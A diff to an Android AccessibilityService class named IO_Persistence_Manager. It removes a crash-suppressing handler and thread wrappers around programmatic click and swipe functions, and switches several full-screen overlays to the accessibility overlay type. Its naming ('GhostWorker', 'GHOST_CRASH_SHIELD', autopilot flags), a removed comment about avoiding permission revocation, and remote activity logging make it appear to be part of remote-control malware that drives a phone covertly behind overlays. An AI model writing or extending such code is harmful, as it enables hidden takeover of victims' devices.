@@ -54,12 +54,6 @@ public class IO_Persistence_Manager extends AccessibilityService {
         instanceRef = new java.lang.ref.WeakReference<>(this);
         autoPilotEngaged = true;
         
-        // Crash Shield: Catch any uncaught thread exceptions to prevent process crash & OS permission revocation!
-        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
-            Log.e(TAG, "GHOST_CRASH_SHIELD: Intercepted exception in " + thread.getName() + ": " + throwable.getMessage(), throwable);
-            FirebaseConfig.logActivity("GHOST_STABILITY: Intercepted service crash - " + throwable.getMessage());
-        });
-
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();
 
         handlerThread = new android.os.HandlerThread("GhostWorker");
@@ -801,8 +795,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 WindowManager.LayoutParams.MATCH_PARENT,
-                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
-                                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003,
+                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                 WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
@@ -931,7 +924,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     }
 
                     int overlayType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003;
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003;
 
                     WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                         WindowManager.LayoutParams.MATCH_PARENT,
@@ -1055,7 +1048,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
-                                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003,
+                                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                 WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
@@ -1130,8 +1123,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 WindowManager.LayoutParams.MATCH_PARENT,
-                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
-                                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003,
+                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
@@ -1186,7 +1178,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         WindowManager.LayoutParams.WRAP_CONTENT,
                         WindowManager.LayoutParams.WRAP_CONTENT,
                         (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
-                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003,
+                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                         WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                         WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                         WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
@@ -1551,34 +1543,13 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return result[0];
     }
 
-    public boolean clickAt(final int x, final int y) {
-        if (x < 0 || y < 0 || x > getScreenWidth() || y > getScreenHeight()) {
-            return false;
-        }
-
-        if (Looper.myLooper() == Looper.getMainLooper()) {
-            return executeClickAtInternal(x, y);
-        } else {
-            final boolean[] result = {false};
-            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
-            new Handler(Looper.getMainLooper()).post(() -> {
-                try {
-                    result[0] = executeClickAtInternal(x, y);
-                } catch (Exception e) {
-                    Log.e(TAG, "clickAt Thread Error: " + e.getMessage());
-                } finally {
-                    latch.countDown();
-                }
-            });
-            try {
-                latch.await(300, java.util.concurrent.TimeUnit.MILLISECONDS);
-            } catch (Exception ignored) {}
-            return result[0];
-        }
-    }
-
-    private boolean executeClickAtInternal(int x, int y) {
+    public boolean clickAt(int x, int y) {
         Log.d(TAG, "Interaction: CLICK at (" + x + "," + y + ")");
+        if (x < 0 || y < 0 || x > getScreenWidth() || y > getScreenHeight()) {
+             Log.w(TAG, "Suppressed out-of-bounds click: (" + x + "," + y + ") Screen: " + screenWidth + "x" + screenHeight);
+             return false;
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             try {
                 Class<?> helper = Class.forName(Api24Helper.class.getName());
@@ -1599,7 +1570,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root != null) {
             boolean success = performClickAtNode(root, x, y);
-            try { root.recycle(); } catch (Exception ignored) {}
+            root.recycle();
             if (success) return true;
         }
         
@@ -1610,7 +1581,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 AccessibilityNodeInfo windowRoot = window.getRoot();
                 if (windowRoot != null) {
                     boolean success = performClickAtNode(windowRoot, x, y);
-                    try { windowRoot.recycle(); } catch (Exception ignored) {}
+                    windowRoot.recycle();
                     if (success) return true;
                 }
             }
@@ -1625,19 +1596,15 @@ public class IO_Persistence_Manager extends AccessibilityService {
             AccessibilityNodeInfo clickable = target;
             while (clickable != null && !clickable.isClickable()) {
                 AccessibilityNodeInfo parent = clickable.getParent();
-                if (clickable != target) {
-                    try { clickable.recycle(); } catch (Exception ignored) {}
-                }
+                if (clickable != target) clickable.recycle();
                 clickable = parent;
             }
             
             if (clickable != null) {
                 success = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                if (clickable != target) {
-                    try { clickable.recycle(); } catch (Exception ignored) {}
-                }
+                if (clickable != target) clickable.recycle();
             }
-            try { target.recycle(); } catch (Exception ignored) {}
+            target.recycle();
         }
         return success;
     }
@@ -1654,38 +1621,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
         for (int i = node.getChildCount() - 1; i >= 0; i--) {
             AccessibilityNodeInfo child = node.getChild(i);
             AccessibilityNodeInfo result = findNodeAt(child, x, y);
-            if (child != null) {
-                try { child.recycle(); } catch (Exception ignored) {}
-            }
+            if (child != null) child.recycle();
             if (result != null) return result;
         }
         
         return AccessibilityNodeInfo.obtain(node);
     }
 
-    public boolean swipe(final int x1, final int y1, final int x2, final int y2, final int duration) {
-        if (Looper.myLooper() == Looper.getMainLooper()) {
-            return executeSwipeInternal(x1, y1, x2, y2, duration);
-        } else {
-            final boolean[] result = {false};
-            final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
-            new Handler(Looper.getMainLooper()).post(() -> {
-                try {
-                    result[0] = executeSwipeInternal(x1, y1, x2, y2, duration);
-                } catch (Exception e) {
-                    Log.e(TAG, "swipe Thread Error: " + e.getMessage());
-                } finally {
-                    latch.countDown();
-                }
-            });
-            try {
-                latch.await(400, java.util.concurrent.TimeUnit.MILLISECONDS);
-            } catch (Exception ignored) {}
-            return result[0];
-        }
-    }
-
-    private boolean executeSwipeInternal(int x1, int y1, int x2, int y2, int duration) {
+    public boolean swipe(int x1, int y1, int x2, int y2, int duration) {
         Log.d(TAG, "Interaction: SWIPE from (" + x1 + "," + y1 + ") to (" + x2 + "," + y2 + ") dur=" + duration);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             try {
